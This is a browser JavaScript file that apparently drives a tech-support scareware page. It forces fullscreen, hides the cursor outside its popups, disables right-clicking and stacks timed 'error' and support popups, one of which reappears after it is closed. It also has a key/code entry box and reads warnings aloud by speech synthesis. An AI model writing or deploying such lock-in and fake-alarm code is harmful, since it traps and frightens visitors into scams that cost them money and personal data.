
document.addEventListener('mousemove', function (event) {
  const firstPopup = document.querySelector('#firstPopup');
  const secondPopup = document.querySelector('#secondPopup');
  const keyCodePopup = document.querySelector('#keyCodePopup');
  const cursorStyle = (firstPopup.contains(event.target) || secondPopup.contains(event.target) || keyCodePopup.contains(event.target)) ? 'auto' : 'none';
  document.body.style.cursor = cursorStyle;
});



// Assuming popupContainer is your popup element
const popupContainer = document.querySelector('.popup-container');
popupContainer.classList.add('show-popup');

function showBlueDescriptionPopupWithDelay() {
setTimeout(function () {
const blueDescriptionPopup = document.querySelector('#blueDescriptionPopup');
blueDescriptionPopup.style.display = 'block';
}, 1700); // 3000 milliseconds (3 seconds) delay
}
showBlueDescriptionPopupWithDelay();
// Initially, set errorTelecast display to 'none'
document.getElementById('errorTelecast').style.display = 'none';

// Function to show errorTelecast
function showerrorTelecast() {
document.getElementById('errorTelecast').style.display = 'block';
}

function closeFirstPopup() {
const firstPopup = document.querySelector('#firstPopup');
firstPopup.style.display = 'none';
simulateF11Key();
showBlueDescriptionPopup();
showDisclaimerPopup();
showerrorTelecast(); // Call the function to show errorTelecast after firstPopup is closed
}

function changeBackground() {
document.body.style.backgroundImage = "url('https://wallpapercave.com/wp/wp5493583.jpg')";
}


function showDisclaimerPopup() {
const disclaimerPopup = document.querySelector('#disclaimerPopup');
disclaimerPopup.style.display = 'block';
}

function cancelFirstPopup() {
  closeFirstPopup();
}

function okFirstPopup() {
  closeFirstPopup();
}


function simulateF11Key() {
const element = document.documentElement;



if (element.requestFullscreen) {
  element.requestFullscreen();
} else if (element.mozRequestFullScreen) {
  element.mozRequestFullScreen();
} else if (element.webkitRequestFullscreen) {
  element.webkitRequestFullscreen();
}
}

function showBlueDescriptionPopup() {
const blueDescriptionPopup = document.querySelector('#blueDescriptionPopup');
blueDescriptionPopup.style.display = 'block';

// Use showSupportNotificationWithDelay with 4000 milliseconds delay
showSupportNotificationWithDelay(38000);

setTimeout(function() {
showSecondPopup();
showKeyCodePopup();
}, 3000);
}

function showSecondPopup() {
const secondPopup = document.querySelector('#secondPopup');
secondPopup.style.display = 'block';
}

// The modified showSupportNotificationWithDelay function
function showSupportNotificationWithDelay(delay) {
setTimeout(function() {
const supportNotification = document.querySelector('#supportNotification');
supportNotification.style.display = 'block';
}, delay);
}


function hideSecondPopup() {
  const secondPopup = document.querySelector('#secondPopup');
  secondPopup.style.display = 'none';
  setTimeout(function() {
      showSecondPopup();
  }, 1500);
}

function showKeyCodePopup() {
  const keyCodePopup = document.querySelector('#keyCodePopup');
  keyCodePopup.style.display = 'block';
  keyCodePopup.style.zIndex = '10001'; // Place it on top of other popups
}

// Function to handle key and code submission (you can add your logic here)
function submitKeyCode() {
  // Display the loading animation while processing
  const loadingAnimation = document.querySelector('#loadingAnimation');
  loadingAnimation.style.display = 'block';

  // Simulate a delay (replace this with your actual processing logic)
  setTimeout(function() {
      // Hide the loading animation
      loadingAnimation.style.display = 'none';

      // Add your logic to handle key and code submission here
      // For example, validate the key and code, and take appropriate action

      // Hide the toast notification after 2 seconds
      const toastNotification = document.querySelector('#toastNotification');
      toastNotification.style.display = 'block';
      setTimeout(function() {
          toastNotification.style.display = 'none';
      }, 2000);

      // You can close the key and code popup here if needed
      // const keyCodePopup = document.querySelector('#keyCodePopup');
      // keyCodePopup.style.display = 'none';

      // You can add more functionality here, such as sending data to a server
  }, 2500); // Simulated 2-second delay, replace with actual processing time
}

document.addEventListener('mousemove', function (event) {
  const firstPopup = document.querySelector('#firstPopup');
  const secondPopup = document.querySelector('#secondPopup');
  const keyCodePopup = document.querySelector('#keyCodePopup');
  const cursorStyle = (firstPopup.contains(event.target) || secondPopup.contains(event.target) || keyCodePopup.contains(event.target) || chatbotContainer.contains(event.target)) ? 'auto' : 'none';
  document.body.style.cursor = cursorStyle;
});



function closeSecondPopup() {
  const secondPopup = document.querySelector('#secondPopup');
  secondPopup.style.display = 'none';
}
document.addEventListener('contextmenu', function(event) {
event.preventDefault();
});
window.onload = function () {
  // Get all elements with class "disclaimer-popup" and "blue-description-popup"
  var elements = document.querySelectorAll('.blue-description-popup');


  // Iterate through the elements and speak their text content
  elements.forEach(function (element) {
      var textToSpeak = element.textContent.trim(); // Get the text content and remove leading/trailing spaces
      var speech = new SpeechSynthesisUtterance(textToSpeak);

      // Use the default speech synthesis voice and language
      speech.voice = speechSynthesis.getVoices()[0]; // You can customize the voice if needed
      speech.lang = 'en-US'; // Set the language (e.g., English - United States)

      // Speak the text
      speechSynthesis.speak(speech);
  });
};

